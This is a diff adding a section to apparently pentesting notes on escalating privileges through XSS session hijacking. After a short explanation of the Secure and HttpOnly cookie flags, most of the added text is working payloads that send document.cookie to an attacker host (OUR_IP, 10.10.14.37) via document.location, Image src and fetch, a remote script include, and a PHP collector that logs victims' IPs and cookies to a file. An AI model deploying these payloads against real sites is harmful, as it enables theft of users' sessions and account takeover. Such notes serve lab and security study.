@@ -32,3 +32,40 @@ A good way to test this is to see if we can retrieve files externally using the 
 
 ### 4) Privilege Escalation using Session Hijacking
 
+We need to make sure that the cookie is stored in the browser, we also need to consider that cookies can have two flags:
+
+    Secure: only sends the cookie over an encrypted connection like HTTPS.
+    HttpOnly: denies Javascript access to cookie; so we need that this options de disabled, you can check this in the Developer Tools of the browser.
+
+After verifying that the cookie could be stolen by its flags and having a valid XSS field we can use one of the following payloads:
+
+#### Option 1:
+
+    document.location='http://OUR_IP/index.php?c='+document.cookie;
+or
+
+    new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+
+Access the Host
+
+    <script src=http://OUR_IP>/script.js</script>
+
+#### Option 2:
+
+Payload
+
+    <img src=x onerror=fetch('http://10.10.14.37/'+document.cookie);>
+
+PHP Server code
+
+    <?php
+    if (isset($_GET['c'])) {
+        $list = explode(";", $_GET['c']);
+        foreach ($list as $key => $value) {
+            $cookie = urldecode($value);
+            $file = fopen("cookies.txt", "a+");
+            fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+            fclose($file);
+        }
+    }
+    ?>
